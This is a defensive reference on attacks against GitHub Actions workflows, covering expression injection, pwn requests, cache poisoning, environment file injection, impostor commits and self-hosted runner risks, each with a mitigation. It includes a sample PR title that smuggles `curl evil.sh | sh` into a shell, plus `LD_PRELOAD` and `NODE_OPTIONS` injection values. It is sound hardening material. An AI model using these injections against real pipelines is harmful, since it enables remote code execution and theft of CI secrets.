# GitHub Actions attacks

The attack behind each item in the hardening checklist. Read this to explain a finding or judge a case the checklist does not cover.

## Expression injection

The runner substitutes `${{ }}` into script text before the shell starts. A PR titled `a"; curl evil.sh | sh; echo "` turns `run: echo "${{ github.event.pull_request.title }}"` into three commands. `actions/github-script` has the same flaw with JavaScript: `script: console.log("${{ github.event.issue.title }}")` executes whatever closes the string.

Tainted contexts include `github.event.{issue,pull_request,comment,review,discussion}.*` (titles, bodies, labels), `github.head_ref`, `github.event.head_commit.*`, `github.event.commits.*`, `github.event.workflow_run.head_branch`, `inputs.*` on composite actions or externally dispatched workflows, and any step output derived from them.

Pass tainted values through `env:` and read `"$VAR"` so the shell treats the value as data:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

## Pwn requests

`pull_request_target`, `workflow_run`, `issue_comment`, and `discussion*` run in the default branch context with the base repository's secrets and a write token. Checking out PR head code (`ref: ${{ github.event.pull_request.head.sha }}`) and running anything from it, such as package install lifecycle scripts, builds, tests, or linter plugins, hands those privileges to the PR author. Note that `issue_comment` fires on both issues and pull requests; check `github.event.issue.pull_request` and caller authorization before acting.

`pull_request` and `pull_request_review*` from a fork receive no secrets and a read-only token, making them the safe place to execute fork code. When a privileged follow-up is needed, use the two-workflow pattern in [templates.md](templates.md). By default, `actions/checkout@v7` sets `allow-unsafe-pr-checkout: false` to block fork checkouts under privileged triggers.

## Artifact and cache poisoning

Artifacts downloaded in a `workflow_run` job were produced by untrusted code. If an artifact lands in the workspace and the job executes a script or build tool from it, the artifact can supply malicious code. Download artifacts to `${{ runner.temp }}`, parse them strictly as data, and verify the PR's `head.sha` matches `github.event.workflow_run.head_sha` before acting on an artifact-supplied PR number.

Caches cross trust levels in one direction: a cache saved on the default branch or a target base branch is restorable by every PR targeting it. A privileged run that executes tainted code can save a poisoned cache that release builds restore, and a release job restoring any cache risks inheriting poisoned build state. zizmor's `cache-poisoning` audit flags both release workflows that restore caches and privileged triggers (`pull_request_target`, `workflow_run`, `issue_comment`) that write caches.

## Environment file injection

`$GITHUB_ENV` and `$GITHUB_PATH` alter every subsequent step in the job. Writing `echo "NAME=$TITLE" >> "$GITHUB_ENV"` lets an attacker inject lines like `LD_PRELOAD=...` or `NODE_OPTIONS=--require=...` and execute arbitrary code in the next step. Keep tainted values out of `$GITHUB_ENV` and `$GITHUB_PATH` completely.

`$GITHUB_OUTPUT` with a heredoc has a similar injection risk. With a static delimiter like `EOF`, a value containing an `EOF` line terminates the value early, and following lines become new step outputs. Generate a random delimiter at runtime with `openssl rand -hex 16`.

## Mutable refs, impostor commits, and unpinned dependencies

Tags and branches can be moved. When a maintainer account is compromised, an attacker re-points `v4` at malicious code, and every workflow referencing `@v4` runs it on the next trigger. In March 2025, `tj-actions/changed-files` (CVE-2025-30066) was retagged to dump CI secrets into workflow logs. A 40-character commit SHA cannot be silently moved.

A raw SHA can still point to an attacker's commit. GitHub serves commits from any fork through the parent repository's URL, so `actions/checkout@<sha>` resolves even if `<sha>` lives only in a fork. `pin-action.sh` resolves SHAs from upstream tags only, and `lint.sh --online` runs zizmor's `impostor-commit` audit on existing SHAs. Apply the same discipline to external `workflow_call` targets (`@<sha>`), `container:` / `services:` / `docker://` images (`@sha256:` digests via `unpinned-images`), and downloaded release binaries (verified SHA-256 checksums via `unpinned-tools`).

## Persisted checkout credentials

`actions/checkout` persists the job token on disk by default (`v6.0.0+` writes it under `$RUNNER_TEMP`; versions below `v6.0.0` wrote it into `.git/config`). Any later step that uploads the workspace, builds an image, or runs tooling reading git credentials can leak the token, as documented in the ArtiPACKED research. Set `persist-credentials: false` to keep the token off disk.

## Long-lived credentials and reusable workflows

A static cloud key stored in repository secrets remains valid until rotated, and every workflow with secret access can exfiltrate it. With OIDC (`permissions: id-token: write`), the job exchanges a short-lived signed token for scoped cloud credentials bound to a specific repo, branch, or `environment:`. Registry trusted publishing (npm, PyPI, crates.io) uses the same OIDC mechanism. Keep deploy secrets and OIDC roles inside protected `environment:` blocks (`secrets-outside-env`) with required reviewers and branch policies.

Reusable workflows (`workflow_call`) run with permissions capped by the caller's `permissions:`. Avoid `secrets: inherit` (`secrets-inherit`), which forwards every repository and environment secret to the callee; declare explicit named secrets instead.

## Secret redaction and condition bypasses

GitHub's runner masks exact secret string values in logs, not parsed subfields or transformed encodings (`unredacted-secrets`). Avoid `fromJSON(secrets.JSON_BLOB)` or encoding secrets directly in outputs. Note also that job outputs containing secrets are redacted and arrive empty in dependent jobs.

Condition checks can also be bypassed: `contains('main master', github.ref_name)` matches partial branch names like `'in'` (`unsound-contains`), and `github.actor` checks can be spoofed by actors or bots (`bot-conditions`); prefer exact equality (`==`), `github.actor_id`, or `author_association`.

## Self-hosted runners

A non-ephemeral self-hosted runner retains disk state, running processes, and internal network access between jobs. On a public repository, any fork PR can execute code on it, persist a backdoor, and query internal services or cloud metadata at `169.254.169.254`. Restrict self-hosted runners to private repositories, use ephemeral environments (such as Actions Runner Controller per-job pods), and limit egress.
